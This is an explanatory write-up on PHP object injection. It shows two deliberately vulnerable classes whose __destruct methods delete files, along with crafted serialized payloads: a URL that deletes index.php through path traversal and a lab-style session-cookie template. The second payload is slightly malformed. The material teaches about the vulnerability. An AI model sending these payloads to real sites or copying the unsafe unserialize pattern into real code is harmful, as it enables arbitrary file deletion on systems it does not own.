Object injection occurs when an application deserializes untrusted data.  The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the `unserialize()` PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable `unserialize()` call, resulting in an arbitrary PHP object(s) injection into the application scope.

# Example 1 
The example below shows a PHP class with an exploitable `__destruct` method:
```php
class Example1{
   public $cache_file;

   function __construct(){
      // some PHP code...
   }

   function __destruct(){
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

$user_data = unserialize($_GET['data']);
```
In this example an attacker might be able to delete an arbitrary file via a Path Traversal attack.
```
http://testsite.com/vuln.php?data=O:8:"Example1":1 {s:10:"cache_file";s:15:"../../index.php";}
```

# Example 2
Again, in the example below the vulnerable function is the `__destruct` method. It takes a file and deletes it.
**Scenario and Steps**: 
- This code is deployed and is part of a web app. 
- The user has a session cookie assigned to their session.
- The attacker needs to create a template that will serve as the session cookie.
	```
	O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/user/flag.txt";
	```
- URL and Base64 encode the template above and replace it with the current cookie.

```php
class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }
    
    function __destruct() {
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
```

# References
- [https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)